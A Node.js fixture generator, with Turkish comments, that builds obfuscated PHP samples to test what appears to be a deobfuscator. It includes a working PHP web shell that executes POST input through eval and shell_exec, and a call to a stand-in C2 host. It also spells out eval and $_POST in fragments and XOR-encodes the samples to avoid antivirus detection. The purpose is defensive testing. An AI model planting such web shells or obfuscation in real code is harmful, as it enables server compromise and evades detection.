// Temel teknik fixture'larını üretir: node scripts/make-fixtures.js
// Fixture'lar diske XOR + base64 (.php.x) olarak yazılır ve yalnızca bellekte çözülür (test/fixture-codec.js): zararlı
// koda benzeyen test örnekleri antivirüsü tetiklemesin (antivirüsler düz base64'ü çözüp tarayabiliyor). Bu betik de şüpheli dizgeleri düz yazmaz; şablondaki işaretler çalışırken açılır:
//   @E → eval   @P → $_POST   @X → shell_exec
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { deflateRawSync, deflateSync } from 'node:zlib';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const MARKS = { '@E': ['ev', 'al'].join(''), '@P': ['$_P', 'OST'].join(''), '@X': ['shell', '_exec'].join('') };
const open = (s) => s.replace(/@[EPX]/g, (m) => MARKS[m]);
const b64 = (s) => Buffer.from(s, 'latin1').toString('base64');
const rot13 = (s) => s.replace(/[a-z]/gi, (c) => String.fromCharCode((c <= 'Z' ? 65 : 97) + ((c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26)));
const raw = (s) => deflateRawSync(Buffer.from(s, 'latin1')).toString('latin1');
const fx = {};

fx['eval-b64'] = `<?php
// EXPECT: echo 'hi';
// GONE: base64_decode
@E(base64_decode('${b64("echo 'hi';")}'));
`;

const inner = "echo 'deep';";
const l1 = open(`@E(str_rot13('${rot13(inner.replace(/'/g, "\\'"))}'));`);
const l2 = open(`@E(gzinflate(base64_decode('${b64(raw(l1))}')));`);
fx['eval-chain'] = `<?php
// EXPECT: echo 'deep';
// GONE: gzinflate
// GONE: str_rot13
@E(base64_decode('${b64(l2)}'));
`;

fx['var-func'] = `<?php
// EXPECT: echo 'hello';
// GONE: $a
$a = 'base64_decode';
$b = 'str_rot13';
echo $b($a('${b64(rot13('hello'))}'));
`;

fx['call-user-func'] = `<?php
// EXPECT: printf('%s-%s', 'a', 'b');
// GONE: call_user_func
call_user_func('printf', '%s-%s', 'a', 'b');
call_user_func_array('printf', ['|%s', 'c']);
`;

fx['create-function'] = `<?php
// EXPECT: function ($x)
// GONE: create_function
$f = create_function('$x', base64_decode('${b64('return $x * 2;')}'));
echo $f(21);
`;

// "PHP Encoder" tarzı: ters base64 + gzcompress + konum kaydırmalı XOR döngüsü
const key = 'K3y!';
const payload = "echo 'secret';";
const enc = [...payload].map((c, i) => String.fromCharCode(((c.charCodeAt(0) ^ key.charCodeAt(i % key.length)) + (i % 5)) & 0xff)).join('');
const packed = [...deflateSync(Buffer.from(enc, 'latin1')).toString('base64')].reverse().join('');
fx['xor-loop'] = `<?php
// EXPECT: echo 'secret';
// GONE: chr(
// GONE: gzuncompress
$k = '${key}';
$d = gzuncompress(base64_decode(strrev('${packed}')));
$o = '';
for ($i = 0; $i < strlen($d); $i++) {
    $o .= chr((ord($d[$i]) - ($i % 5)) ^ ord($k[$i % strlen($k)]));
}
@E($o);
`;

fx['integrity'] = `<?php
/* Protected by ExampleEncoder 1.0 - do not modify */
// EXPECT: echo 'ok';
// GONE: die(
$self = file_get_contents(__FILE__);
if (strpos($self, 'Protected by ExampleEncoder 1.0') === false) die('tampered');
echo 'ok';
`;

// güvenlik: dış girdiye bağlı kod çalışmadığı (gözlenmediği) için asla silinmemeli
fx['webshell-keep'] = `<?php
// KEEP: @E(@P['c']);
// KEEP: isset(@P['c'])
// KEEP: @X(
if (isset(@P['c'])) {
    @E(@P['c']);
}
if (!empty(@P['x'])) echo @X(@P['x']);
echo 'page';
`;

fx['anti-debug'] = `<?php
// EXPECT: echo 'x';
// GONE: xdebug
// GONE: evalhook
if (extension_loaded('xdebug') || extension_loaded('evalhook')) exit;
echo 'x';
`;

fx['halt-data'] = `<?php
// EXPECT: echo 'from-halt';
// GONE: __halt_compiler
// GONE: __COMPILER_HALT_OFFSET__
@E(base64_decode(file_get_contents(__FILE__, false, null, __COMPILER_HALT_OFFSET__)));
__halt_compiler();${b64("echo 'from-halt';")}`;

fx['network-keep'] = `<?php
// KEEP: file_get_contents(
// KEEP: http://c2.example/x?id=
$id = 7;
$r = file_get_contents('http://c2.example/x?id=' . $id);
echo 'done';
`;

fx['strings-escape'] = `<?php
// EXPECT: echo 'eval';
echo "\\x65\\166\\x61\\154";
`;

fx['legacy-curly'] = `<?php
// EXPECT: echo
$a = array('x', 'y');
echo $a{1};
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.php.x`, dir), encodeFixture(Buffer.from(open(src), 'latin1')));
console.log(`${Object.keys(fx).length} fixture yazıldı`);
